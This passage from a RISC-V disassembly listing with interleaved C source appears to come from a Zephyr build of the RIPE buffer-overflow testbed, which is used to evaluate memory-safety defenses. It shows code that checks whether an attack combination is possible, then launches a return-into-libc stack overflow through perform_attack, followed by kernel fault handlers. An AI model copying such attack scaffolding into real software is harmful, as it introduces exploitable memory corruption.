                if ((attack.code_ptr == FUNC_PTR_HEAP) ||
800435a8:	800477b7          	lui	a5,0x80047
800435ac:	f0078793          	addi	a5,a5,-256 # 80046f00 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80046f01>
800435b0:	479c                	lw	a5,8(a5)
                  (attack.code_ptr == FUNC_PTR_BSS) ||
800435b2:	ed178693          	addi	a3,a5,-303
                if ((attack.code_ptr == FUNC_PTR_HEAP) ||
800435b6:	4709                	li	a4,2
800435b8:	04d77063          	bgeu	a4,a3,800435f8 <is_attack_possible+0x1c6>
                  (attack.code_ptr == FUNC_PTR_DATA) ||
800435bc:	13400713          	li	a4,308
800435c0:	02e78c63          	beq	a5,a4,800435f8 <is_attack_possible+0x1c6>
                  (attack.code_ptr == LONGJMP_BUF_HEAP) ||
800435c4:	13600713          	li	a4,310
800435c8:	02e78863          	beq	a5,a4,800435f8 <is_attack_possible+0x1c6>
                  (attack.code_ptr == LONGJMP_BUF_DATA) ||
800435cc:	13500713          	li	a4,309
800435d0:	02e78463          	beq	a5,a4,800435f8 <is_attack_possible+0x1c6>
                  (attack.code_ptr == LONGJMP_BUF_BSS) ||
800435d4:	13800713          	li	a4,312
800435d8:	02e78063          	beq	a5,a4,800435f8 <is_attack_possible+0x1c6>
                  (attack.code_ptr == STRUCT_FUNC_PTR_HEAP) ||
800435dc:	13900713          	li	a4,313
800435e0:	00e78c63          	beq	a5,a4,800435f8 <is_attack_possible+0x1c6>
                  (attack.code_ptr == STRUCT_FUNC_PTR_DATA) ||
800435e4:	13a00713          	li	a4,314
800435e8:	00e78863          	beq	a5,a4,800435f8 <is_attack_possible+0x1c6>
                } else if ((attack.code_ptr == FUNC_PTR_STACK_PARAM) &&
800435ec:	12e00713          	li	a4,302
800435f0:	00e78c63          	beq	a5,a4,80043608 <is_attack_possible+0x1d6>
    return TRUE;
800435f4:	4505                	li	a0,1
800435f6:	b765                	j	8004359e <is_attack_possible+0x16c>
                    fprintf(stderr,
800435f8:	80045537          	lui	a0,0x80045
800435fc:	7d450513          	addi	a0,a0,2004 # 800457d4 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x800457d5>
80043600:	29d000ef          	jal	ra,8004409c <printk>
                    return FALSE;
80043604:	4501                	li	a0,0
80043606:	bf61                	j	8004359e <is_attack_possible+0x16c>
                  ((attack.function == STRCAT) ||
80043608:	800477b7          	lui	a5,0x80047
8004360c:	f0078793          	addi	a5,a5,-256 # 80046f00 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80046f01>
80043610:	4b9c                	lw	a5,16(a5)
80043612:	e0878693          	addi	a3,a5,-504
                } else if ((attack.code_ptr == FUNC_PTR_STACK_PARAM) &&
80043616:	4705                	li	a4,1
80043618:	00d77c63          	bgeu	a4,a3,80043630 <is_attack_possible+0x1fe>
                  (attack.function == SNPRINTF) ||
8004361c:	1fb00713          	li	a4,507
80043620:	00e78863          	beq	a5,a4,80043630 <is_attack_possible+0x1fe>
                  (attack.function == SSCANF) ||
80043624:	1fc00713          	li	a4,508
80043628:	00e78463          	beq	a5,a4,80043630 <is_attack_possible+0x1fe>
    return TRUE;
8004362c:	4505                	li	a0,1
8004362e:	bf85                	j	8004359e <is_attack_possible+0x16c>
                    fprintf(stderr,
80043630:	80046537          	lui	a0,0x80046
80043634:	82c50513          	addi	a0,a0,-2004 # 8004582c <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x8004582d>
80043638:	265000ef          	jal	ra,8004409c <printk>
                    return FALSE;
8004363c:	4501                	li	a0,0
8004363e:	b785                	j	8004359e <is_attack_possible+0x16c>
            if ((attack.technique == DIRECT) &&
80043640:	800477b7          	lui	a5,0x80047
80043644:	f007a703          	lw	a4,-256(a5) # 80046f00 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80046f01>
80043648:	06400793          	li	a5,100
8004364c:	00f70463          	beq	a4,a5,80043654 <is_attack_possible+0x222>
    return TRUE;
80043650:	4505                	li	a0,1
80043652:	b7b1                	j	8004359e <is_attack_possible+0x16c>
              ((attack.code_ptr == RET_ADDR) ||
80043654:	800477b7          	lui	a5,0x80047
80043658:	f0078793          	addi	a5,a5,-256 # 80046f00 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80046f01>
8004365c:	479c                	lw	a5,8(a5)
              (attack.code_ptr == FUNC_PTR_STACK_VAR) ||
8004365e:	ed478693          	addi	a3,a5,-300
            if ((attack.technique == DIRECT) &&
80043662:	4709                	li	a4,2
80043664:	04d77863          	bgeu	a4,a3,800436b4 <is_attack_possible+0x282>
              (attack.code_ptr == FUNC_PTR_STACK_PARAM) ||
80043668:	13000713          	li	a4,304
8004366c:	04e78463          	beq	a5,a4,800436b4 <is_attack_possible+0x282>
              (attack.code_ptr == FUNC_PTR_BSS) ||
80043670:	13100713          	li	a4,305
80043674:	04e78063          	beq	a5,a4,800436b4 <is_attack_possible+0x282>
              (attack.code_ptr == FUNC_PTR_DATA) ||
80043678:	13200713          	li	a4,306
8004367c:	02e78c63          	beq	a5,a4,800436b4 <is_attack_possible+0x282>
              (attack.code_ptr == LONGJMP_BUF_STACK_VAR) ||
80043680:	13300713          	li	a4,307
80043684:	02e78863          	beq	a5,a4,800436b4 <is_attack_possible+0x282>
              (attack.code_ptr == LONGJMP_BUF_STACK_PARAM) ||
80043688:	13500713          	li	a4,309
8004368c:	02e78463          	beq	a5,a4,800436b4 <is_attack_possible+0x282>
              (attack.code_ptr == LONGJMP_BUF_BSS) ||
80043690:	13600713          	li	a4,310
80043694:	02e78063          	beq	a5,a4,800436b4 <is_attack_possible+0x282>
              (attack.code_ptr == LONGJMP_BUF_DATA) ||
80043698:	13700713          	li	a4,311
8004369c:	00e78c63          	beq	a5,a4,800436b4 <is_attack_possible+0x282>
              (attack.code_ptr == STRUCT_FUNC_PTR_STACK) ||
800436a0:	13900713          	li	a4,313
800436a4:	00e78863          	beq	a5,a4,800436b4 <is_attack_possible+0x282>
              (attack.code_ptr == STRUCT_FUNC_PTR_DATA) ||
800436a8:	13a00713          	li	a4,314
800436ac:	00e78463          	beq	a5,a4,800436b4 <is_attack_possible+0x282>
    return TRUE;
800436b0:	4505                	li	a0,1
800436b2:	b5f5                	j	8004359e <is_attack_possible+0x16c>
                fprintf(stderr,
800436b4:	80046537          	lui	a0,0x80046
800436b8:	8b850513          	addi	a0,a0,-1864 # 800458b8 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x800458b9>
800436bc:	1e1000ef          	jal	ra,8004409c <printk>
                return FALSE;
800436c0:	4501                	li	a0,0
800436c2:	bdf1                	j	8004359e <is_attack_possible+0x16c>
              ((attack.code_ptr == RET_ADDR) ||
800436c4:	800477b7          	lui	a5,0x80047
800436c8:	f0078793          	addi	a5,a5,-256 # 80046f00 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80046f01>
800436cc:	479c                	lw	a5,8(a5)
              (attack.code_ptr == FUNC_PTR_STACK_VAR) ||
800436ce:	ed478693          	addi	a3,a5,-300
            if ((attack.technique == DIRECT) &&
800436d2:	4709                	li	a4,2
800436d4:	04d77863          	bgeu	a4,a3,80043724 <is_attack_possible+0x2f2>
              (attack.code_ptr == FUNC_PTR_STACK_PARAM) ||
800436d8:	13000713          	li	a4,304
800436dc:	04e78463          	beq	a5,a4,80043724 <is_attack_possible+0x2f2>
              (attack.code_ptr == FUNC_PTR_BSS) ||
800436e0:	12f00713          	li	a4,303
800436e4:	04e78063          	beq	a5,a4,80043724 <is_attack_possible+0x2f2>
              (attack.code_ptr == FUNC_PTR_HEAP) ||
800436e8:	13200713          	li	a4,306
800436ec:	02e78c63          	beq	a5,a4,80043724 <is_attack_possible+0x2f2>
              (attack.code_ptr == LONGJMP_BUF_STACK_VAR) ||
800436f0:	13300713          	li	a4,307
800436f4:	02e78863          	beq	a5,a4,80043724 <is_attack_possible+0x2f2>
              (attack.code_ptr == LONGJMP_BUF_STACK_PARAM) ||
800436f8:	13400713          	li	a4,308
800436fc:	02e78463          	beq	a5,a4,80043724 <is_attack_possible+0x2f2>
              (attack.code_ptr == LONGJMP_BUF_HEAP) ||
80043700:	13500713          	li	a4,309
80043704:	02e78063          	beq	a5,a4,80043724 <is_attack_possible+0x2f2>
              (attack.code_ptr == LONGJMP_BUF_BSS) ||
80043708:	13700713          	li	a4,311
8004370c:	00e78c63          	beq	a5,a4,80043724 <is_attack_possible+0x2f2>
              (attack.code_ptr == STRUCT_FUNC_PTR_STACK) ||
80043710:	13800713          	li	a4,312
80043714:	00e78863          	beq	a5,a4,80043724 <is_attack_possible+0x2f2>
              (attack.code_ptr == STRUCT_FUNC_PTR_HEAP) ||
80043718:	13a00713          	li	a4,314
8004371c:	00e78463          	beq	a5,a4,80043724 <is_attack_possible+0x2f2>
    return TRUE;
80043720:	4505                	li	a0,1
80043722:	bdb5                	j	8004359e <is_attack_possible+0x16c>
                fprintf(stderr,
80043724:	80046537          	lui	a0,0x80046
80043728:	91050513          	addi	a0,a0,-1776 # 80045910 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80045911>
8004372c:	171000ef          	jal	ra,8004409c <printk>
                return FALSE;
80043730:	4501                	li	a0,0
80043732:	b5b5                	j	8004359e <is_attack_possible+0x16c>
            if ((attack.technique == DIRECT) &&
80043734:	800477b7          	lui	a5,0x80047
80043738:	f007a783          	lw	a5,-256(a5) # 80046f00 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80046f01>
8004373c:	06400713          	li	a4,100
80043740:	00e78863          	beq	a5,a4,80043750 <is_attack_possible+0x31e>
            } else if ((attack.technique == INDIRECT) &&
80043744:	06500713          	li	a4,101
80043748:	06e78a63          	beq	a5,a4,800437bc <is_attack_possible+0x38a>
    return TRUE;
8004374c:	4505                	li	a0,1
8004374e:	bd81                	j	8004359e <is_attack_possible+0x16c>
              ((attack.code_ptr == RET_ADDR) ||
80043750:	80047737          	lui	a4,0x80047
80043754:	f0070713          	addi	a4,a4,-256 # 80046f00 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80046f01>
80043758:	4718                	lw	a4,8(a4)
              (attack.code_ptr == FUNC_PTR_STACK_VAR) ||
8004375a:	ed470613          	addi	a2,a4,-300
            if ((attack.technique == DIRECT) &&
8004375e:	4689                	li	a3,2
80043760:	04c6f663          	bgeu	a3,a2,800437ac <is_attack_possible+0x37a>
              (attack.code_ptr == FUNC_PTR_STACK_PARAM) ||
80043764:	13100693          	li	a3,305
80043768:	04d70263          	beq	a4,a3,800437ac <is_attack_possible+0x37a>
              (attack.code_ptr == FUNC_PTR_DATA) ||
8004376c:	12f00693          	li	a3,303
80043770:	02d70e63          	beq	a4,a3,800437ac <is_attack_possible+0x37a>
              (attack.code_ptr == FUNC_PTR_HEAP) ||
80043774:	13200693          	li	a3,306
80043778:	02d70a63          	beq	a4,a3,800437ac <is_attack_possible+0x37a>
              (attack.code_ptr == LONGJMP_BUF_STACK_VAR) ||
8004377c:	13300693          	li	a3,307
80043780:	02d70663          	beq	a4,a3,800437ac <is_attack_possible+0x37a>
              (attack.code_ptr == LONGJMP_BUF_STACK_PARAM) ||
80043784:	13400693          	li	a3,308
80043788:	02d70263          	beq	a4,a3,800437ac <is_attack_possible+0x37a>
              (attack.code_ptr == LONGJMP_BUF_HEAP) ||
8004378c:	13600693          	li	a3,310
80043790:	00d70e63          	beq	a4,a3,800437ac <is_attack_possible+0x37a>
              (attack.code_ptr == LONGJMP_BUF_DATA) ||
80043794:	13700693          	li	a3,311
80043798:	00d70a63          	beq	a4,a3,800437ac <is_attack_possible+0x37a>
              (attack.code_ptr == STRUCT_FUNC_PTR_STACK) ||
8004379c:	13800693          	li	a3,312
800437a0:	00d70663          	beq	a4,a3,800437ac <is_attack_possible+0x37a>
              (attack.code_ptr == STRUCT_FUNC_PTR_HEAP) ||
800437a4:	13900693          	li	a3,313
800437a8:	f8d71ee3          	bne	a4,a3,80043744 <is_attack_possible+0x312>
                fprintf(stderr,
800437ac:	80046537          	lui	a0,0x80046
800437b0:	97050513          	addi	a0,a0,-1680 # 80045970 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80045971>
800437b4:	0e9000ef          	jal	ra,8004409c <printk>
                return FALSE;
800437b8:	4501                	li	a0,0
800437ba:	b3d5                	j	8004359e <is_attack_possible+0x16c>
              (attack.code_ptr == LONGJMP_BUF_HEAP) &&
800437bc:	800477b7          	lui	a5,0x80047
800437c0:	f0078793          	addi	a5,a5,-256 # 80046f00 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80046f01>
800437c4:	4798                	lw	a4,8(a5)
            } else if ((attack.technique == INDIRECT) &&
800437c6:	13400793          	li	a5,308
800437ca:	00f70463          	beq	a4,a5,800437d2 <is_attack_possible+0x3a0>
    return TRUE;
800437ce:	4505                	li	a0,1
800437d0:	b3f9                	j	8004359e <is_attack_possible+0x16c>
              (!(attack.function == MEMCPY) &&
800437d2:	800477b7          	lui	a5,0x80047
800437d6:	f0078793          	addi	a5,a5,-256 # 80046f00 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80046f01>
800437da:	4b9c                	lw	a5,16(a5)
              (attack.code_ptr == LONGJMP_BUF_HEAP) &&
800437dc:	1f400713          	li	a4,500
800437e0:	02e78463          	beq	a5,a4,80043808 <is_attack_possible+0x3d6>
              (!(attack.function == MEMCPY) &&
800437e4:	1f600713          	li	a4,502
800437e8:	02e78263          	beq	a5,a4,8004380c <is_attack_possible+0x3da>
              !(attack.function == STRNCPY) &&
800437ec:	1fc00713          	li	a4,508
800437f0:	00e79463          	bne	a5,a4,800437f8 <is_attack_possible+0x3c6>
    return TRUE;
800437f4:	4505                	li	a0,1
800437f6:	b365                	j	8004359e <is_attack_possible+0x16c>
                fprintf(stderr,
800437f8:	80046537          	lui	a0,0x80046
800437fc:	9c850513          	addi	a0,a0,-1592 # 800459c8 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x800459c9>
80043800:	09d000ef          	jal	ra,8004409c <printk>
                return FALSE;
80043804:	4501                	li	a0,0
80043806:	bb61                	j	8004359e <is_attack_possible+0x16c>
    return TRUE;
80043808:	4505                	li	a0,1
8004380a:	bb51                	j	8004359e <is_attack_possible+0x16c>
8004380c:	4505                	li	a0,1
8004380e:	bb41                	j	8004359e <is_attack_possible+0x16c>

80043810 <try_attack>:
{
80043810:	7129                	addi	sp,sp,-320
80043812:	12112e23          	sw	ra,316(sp)
    if (is_attack_possible()) {
80043816:	3931                	jal	80043432 <is_attack_possible>
80043818:	cd01                	beqz	a0,80043830 <try_attack+0x20>
        perform_attack(&dummy_function, stack_jmp_buffer_param);
8004381a:	858a                	mv	a1,sp
8004381c:	80042537          	lui	a0,0x80042
80043820:	2c650513          	addi	a0,a0,710 # 800422c6 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x800422c7>
80043824:	822ff0ef          	jal	ra,80042846 <perform_attack>
}
80043828:	13c12083          	lw	ra,316(sp)
8004382c:	6131                	addi	sp,sp,320
8004382e:	8082                	ret
        exit(ATTACK_IMPOSSIBLE);
80043830:	c7c00513          	li	a0,-900
80043834:	e19fc0ef          	jal	ra,8004064c <exit>

80043838 <main>:
{
80043838:	1141                	addi	sp,sp,-16
8004383a:	c606                	sw	ra,12(sp)
    printk("RIPE is alive! %s\n", CONFIG_BOARD);
8004383c:	800465b7          	lui	a1,0x80046
80043840:	a1858593          	addi	a1,a1,-1512 # 80045a18 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80045a19>
80043844:	80046537          	lui	a0,0x80046
80043848:	a2450513          	addi	a0,a0,-1500 # 80045a24 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80045a25>
8004384c:	051000ef          	jal	ra,8004409c <printk>
	printk("-t indirect -i returnintolibc -c ret -l stack -f memcpy");
80043850:	80046537          	lui	a0,0x80046
80043854:	a3850513          	addi	a0,a0,-1480 # 80045a38 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80045a39>
80043858:	045000ef          	jal	ra,8004409c <printk>
    attack.technique = INDIRECT; attack.inject_param = RETURN_INTO_LIBC; attack.code_ptr= RET_ADDR; attack.location = STACK;  attack.function = HOMEBREW;
8004385c:	800477b7          	lui	a5,0x80047
80043860:	f0078793          	addi	a5,a5,-256 # 80046f00 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80046f01>
80043864:	06500713          	li	a4,101
80043868:	c398                	sw	a4,0(a5)
8004386a:	0c900713          	li	a4,201
8004386e:	c3d8                	sw	a4,4(a5)
80043870:	12c00713          	li	a4,300
80043874:	c798                	sw	a4,8(a5)
80043876:	19000713          	li	a4,400
8004387a:	c7d8                	sw	a4,12(a5)
8004387c:	1fc00713          	li	a4,508
80043880:	cb98                	sw	a4,16(a5)
    try_attack();
80043882:	3779                	jal	80043810 <try_attack>
    printf("Unexpected back in main\n");
80043884:	80046537          	lui	a0,0x80046
80043888:	a7050513          	addi	a0,a0,-1424 # 80045a70 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80045a71>
8004388c:	011000ef          	jal	ra,8004409c <printk>
}
80043890:	40b2                	lw	ra,12(sp)
80043892:	0141                	addi	sp,sp,16
80043894:	8082                	ret

80043896 <cause_str>:
}


static char *cause_str(u32_t cause)
{
	switch (cause) {
80043896:	4795                	li	a5,5
80043898:	04a7e363          	bltu	a5,a0,800438de <cause_str+0x48>
8004389c:	050a                	slli	a0,a0,0x2
8004389e:	800467b7          	lui	a5,0x80046
800438a2:	efc78793          	addi	a5,a5,-260 # 80045efc <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80045efd>
800438a6:	953e                	add	a0,a0,a5
800438a8:	411c                	lw	a5,0(a0)
800438aa:	8782                	jr	a5
	case 0:
		return "Instruction address misaligned";
800438ac:	80046537          	lui	a0,0x80046
800438b0:	00c50513          	addi	a0,a0,12 # 8004600c <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x8004600d>
800438b4:	8082                	ret
	case 1:
		return "Instruction Access fault";
	case 2:
		return "Illegal instruction";
800438b6:	80046537          	lui	a0,0x80046
800438ba:	fc050513          	addi	a0,a0,-64 # 80045fc0 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80045fc1>
800438be:	8082                	ret
	case 3:
		return "Breakpoint";
800438c0:	80046537          	lui	a0,0x80046
800438c4:	fd450513          	addi	a0,a0,-44 # 80045fd4 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80045fd5>
800438c8:	8082                	ret
	case 4:
		return "Load address misaligned";
800438ca:	80046537          	lui	a0,0x80046
800438ce:	fe050513          	addi	a0,a0,-32 # 80045fe0 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80045fe1>
800438d2:	8082                	ret
	case 5:
		return "Load access fault";
800438d4:	80046537          	lui	a0,0x80046
800438d8:	ff850513          	addi	a0,a0,-8 # 80045ff8 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80045ff9>
800438dc:	8082                	ret
	default:
		return "unknown";
800438de:	80046537          	lui	a0,0x80046
800438e2:	f9c50513          	addi	a0,a0,-100 # 80045f9c <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80045f9d>
800438e6:	8082                	ret
		return "Instruction Access fault";
800438e8:	80046537          	lui	a0,0x80046
800438ec:	fa450513          	addi	a0,a0,-92 # 80045fa4 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80045fa5>
	}
}
800438f0:	8082                	ret

800438f2 <z_SysFatalErrorHandler>:
{
800438f2:	1141                	addi	sp,sp,-16
800438f4:	c606                	sw	ra,12(sp)
800438f6:	c422                	sw	s0,8(sp)
	if (reason == _NANO_ERR_KERNEL_PANIC) {
800438f8:	4799                	li	a5,6
800438fa:	02f50563          	beq	a0,a5,80043924 <z_SysFatalErrorHandler+0x32>
	if (k_is_in_isr() || z_is_thread_essential()) {
800438fe:	270010ef          	jal	ra,80044b6e <k_is_in_isr>
80043902:	e501                	bnez	a0,8004390a <z_SysFatalErrorHandler+0x18>
80043904:	278010ef          	jal	ra,80044b7c <z_is_thread_essential>
80043908:	c515                	beqz	a0,80043934 <z_SysFatalErrorHandler+0x42>
		       k_is_in_isr() ? "ISR" : "essential thread");
8004390a:	264010ef          	jal	ra,80044b6e <k_is_in_isr>
		printk("Fatal fault in %s! Spinning...\n",
8004390e:	cd11                	beqz	a0,8004392a <z_SysFatalErrorHandler+0x38>
80043910:	800465b7          	lui	a1,0x80046
80043914:	1bc58593          	addi	a1,a1,444 # 800461bc <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x800461bd>
80043918:	80046537          	lui	a0,0x80046
8004391c:	1c050513          	addi	a0,a0,448 # 800461c0 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x800461c1>
80043920:	77c000ef          	jal	ra,8004409c <printk>
		k_cpu_idle();
80043924:	798000ef          	jal	ra,800440bc <k_cpu_idle>
80043928:	bff5                	j	80043924 <z_SysFatalErrorHandler+0x32>
		printk("Fatal fault in %s! Spinning...\n",
8004392a:	800465b7          	lui	a1,0x80046
8004392e:	1a858593          	addi	a1,a1,424 # 800461a8 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x800461a9>
80043932:	b7dd                	j	80043918 <z_SysFatalErrorHandler+0x26>
	printk("Fatal fault in thread %p! Aborting.\n", _current);
80043934:	80047437          	lui	s0,0x80047
80043938:	24840413          	addi	s0,s0,584 # 80047248 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80047249>
8004393c:	440c                	lw	a1,8(s0)
8004393e:	80046537          	lui	a0,0x80046
80043942:	1e050513          	addi	a0,a0,480 # 800461e0 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x800461e1>
80043946:	756000ef          	jal	ra,8004409c <printk>

K_SYSCALL_DECLARE1_VOID(K_SYSCALL_K_WAKEUP, k_wakeup, k_tid_t, thread)

K_SYSCALL_DECLARE0(K_SYSCALL_K_CURRENT_GET, k_current_get, k_tid_t)

K_SYSCALL_DECLARE1_VOID(K_SYSCALL_K_THREAD_ABORT, k_thread_abort, k_tid_t, thread)
8004394a:	4408                	lw	a0,8(s0)
8004394c:	3d0010ef          	jal	ra,80044d1c <z_impl_k_thread_abort>
80043950:	bfd1                	j	80043924 <z_SysFatalErrorHandler+0x32>

80043952 <z_NanoFatalErrorHandler>:
{
80043952:	715d                	addi	sp,sp,-80
80043954:	c686                	sw	ra,76(sp)
80043956:	c4a2                	sw	s0,72(sp)
80043958:	c2a6                	sw	s1,68(sp)
8004395a:	84aa                	mv	s1,a0
8004395c:	842e                	mv	s0,a1
	switch (reason) {
8004395e:	4799                	li	a5,6
80043960:	08a7e963          	bltu	a5,a0,800439f2 <z_NanoFatalErrorHandler+0xa0>
80043964:	00251793          	slli	a5,a0,0x2
80043968:	80046737          	lui	a4,0x80046
8004396c:	f1470713          	addi	a4,a4,-236 # 80045f14 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80045f15>
80043970:	97ba                	add	a5,a5,a4
80043972:	439c                	lw	a5,0(a5)
80043974:	8782                	jr	a5
		printk("**** Kernel Allocation Failure! ****\n");
80043976:	80046537          	lui	a0,0x80046
8004397a:	02c50513          	addi	a0,a0,44 # 8004602c <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x8004602d>
8004397e:	2f39                	jal	8004409c <printk>
K_SYSCALL_DECLARE0(K_SYSCALL_K_CURRENT_GET, k_current_get, k_tid_t)
80043980:	1e2010ef          	jal	ra,80044b62 <z_impl_k_current_get>
	printk("Current thread ID = %p\n"
80043984:	407c                	lw	a5,68(s0)
80043986:	d83e                	sw	a5,48(sp)
80043988:	403c                	lw	a5,64(s0)
8004398a:	d63e                	sw	a5,44(sp)
8004398c:	5c5c                	lw	a5,60(s0)
8004398e:	d43e                	sw	a5,40(sp)
80043990:	5c1c                	lw	a5,56(s0)
80043992:	d23e                	sw	a5,36(sp)
80043994:	585c                	lw	a5,52(s0)
80043996:	d03e                	sw	a5,32(sp)
80043998:	581c                	lw	a5,48(s0)
8004399a:	ce3e                	sw	a5,28(sp)
8004399c:	545c                	lw	a5,44(s0)
8004399e:	cc3e                	sw	a5,24(sp)
800439a0:	541c                	lw	a5,40(s0)
800439a2:	ca3e                	sw	a5,20(sp)
800439a4:	505c                	lw	a5,36(s0)
800439a6:	c83e                	sw	a5,16(sp)
800439a8:	501c                	lw	a5,32(s0)
800439aa:	c63e                	sw	a5,12(sp)
800439ac:	4c5c                	lw	a5,28(s0)
800439ae:	c43e                	sw	a5,8(sp)
800439b0:	4c1c                	lw	a5,24(s0)
800439b2:	c23e                	sw	a5,4(sp)
800439b4:	485c                	lw	a5,20(s0)
800439b6:	c03e                	sw	a5,0(sp)
800439b8:	01042883          	lw	a7,16(s0)
800439bc:	00c42803          	lw	a6,12(s0)
800439c0:	441c                	lw	a5,8(s0)
800439c2:	4058                	lw	a4,4(s0)
800439c4:	4014                	lw	a3,0(s0)
800439c6:	4430                	lw	a2,72(s0)
800439c8:	85aa                	mv	a1,a0
800439ca:	80046537          	lui	a0,0x80046
800439ce:	0b050513          	addi	a0,a0,176 # 800460b0 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x800460b1>
800439d2:	25e9                	jal	8004409c <printk>
	z_SysFatalErrorHandler(reason, esf);
800439d4:	85a2                	mv	a1,s0
800439d6:	8526                	mv	a0,s1
800439d8:	3f29                	jal	800438f2 <z_SysFatalErrorHandler>
		printk("***** Kernel OOPS! *****\n");
800439da:	80046537          	lui	a0,0x80046
800439de:	05450513          	addi	a0,a0,84 # 80046054 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80046055>
800439e2:	2d6d                	jal	8004409c <printk>
		break;
800439e4:	bf71                	j	80043980 <z_NanoFatalErrorHandler+0x2e>
		printk("***** Kernel Panic! *****\n");
800439e6:	80046537          	lui	a0,0x80046
800439ea:	07050513          	addi	a0,a0,112 # 80046070 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80046071>
800439ee:	257d                	jal	8004409c <printk>
		break;
800439f0:	bf41                	j	80043980 <z_NanoFatalErrorHandler+0x2e>
		printk("**** Unknown Fatal Error %d! ****\n", reason);
800439f2:	85a6                	mv	a1,s1
800439f4:	80046537          	lui	a0,0x80046
800439f8:	08c50513          	addi	a0,a0,140 # 8004608c <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x8004608d>
800439fc:	2545                	jal	8004409c <printk>
		break;
800439fe:	b749                	j	80043980 <z_NanoFatalErrorHandler+0x2e>

80043a00 <_Fault>:


FUNC_NORETURN void _Fault(const NANO_ESF *esf)
{
80043a00:	1141                	addi	sp,sp,-16
80043a02:	c606                	sw	ra,12(sp)
80043a04:	c422                	sw	s0,8(sp)
80043a06:	c226                	sw	s1,4(sp)
80043a08:	84aa                	mv	s1,a0
	u32_t mcause;

	__asm__ volatile("csrr %0, mcause" : "=r" (mcause));
80043a0a:	34202473          	csrr	s0,mcause

	mcause &= SOC_MCAUSE_EXP_MASK;
80043a0e:	800007b7          	lui	a5,0x80000
80043a12:	fff7c793          	not	a5,a5
80043a16:	8c7d                	and	s0,s0,a5
	printk("Exception cause %s (%d)\n", cause_str(mcause), (int)mcause);
80043a18:	8522                	mv	a0,s0
80043a1a:	3db5                	jal	80043896 <cause_str>
80043a1c:	8622                	mv	a2,s0
80043a1e:	85aa                	mv	a1,a0
80043a20:	80046537          	lui	a0,0x80046
80043a24:	f3050513          	addi	a0,a0,-208 # 80045f30 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80045f31>
80043a28:	2d95                	jal	8004409c <printk>

	z_NanoFatalErrorHandler(_NANO_ERR_CPU_EXCEPTION, esf);
80043a2a:	85a6                	mv	a1,s1
80043a2c:	4501                	li	a0,0
80043a2e:	3715                	jal	80043952 <z_NanoFatalErrorHandler>

80043a30 <z_irq_spurious>:
#include <toolchain.h>
#include <kernel_structs.h>
#include <misc/printk.h>

void z_irq_spurious(void *unused)
{
80043a30:	1141                	addi	sp,sp,-16
80043a32:	c606                	sw	ra,12(sp)
	u32_t mcause;

	ARG_UNUSED(unused);

	__asm__ volatile("csrr %0, mcause" : "=r" (mcause));
80043a34:	342025f3          	csrr	a1,mcause

	mcause &= SOC_MCAUSE_EXP_MASK;

	printk("Spurious interrupt detected! IRQ: %d\n", (int)mcause);
80043a38:	800007b7          	lui	a5,0x80000
80043a3c:	fff7c793          	not	a5,a5
80043a40:	8dfd                	and	a1,a1,a5
80043a42:	80046537          	lui	a0,0x80046
80043a46:	20850513          	addi	a0,a0,520 # 80046208 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80046209>
80043a4a:	2d89                	jal	8004409c <printk>
		printk("PLIC interrupt line causing the IRQ: %d\n",
		       riscv_plic_get_irq());
	}
#endif

	z_NanoFatalErrorHandler(_NANO_ERR_SPURIOUS_INT, &_default_esf);
80043a4c:	800465b7          	lui	a1,0x80046
80043a50:	f4c58593          	addi	a1,a1,-180 # 80045f4c <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80045f4d>
80043a54:	4511                	li	a0,4
80043a56:	3df5                	jal	80043952 <z_NanoFatalErrorHandler>

80043a58 <z_irq_do_offload>:
 */
void z_irq_do_offload(void)
{
	irq_offload_routine_t tmp;

	if (!_offload_routine)
80043a58:	800477b7          	lui	a5,0x80047
80043a5c:	db07a783          	lw	a5,-592(a5) # 80046db0 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80046db1>
80043a60:	c395                	beqz	a5,80043a84 <z_irq_do_offload+0x2c>
{
80043a62:	1141                	addi	sp,sp,-16
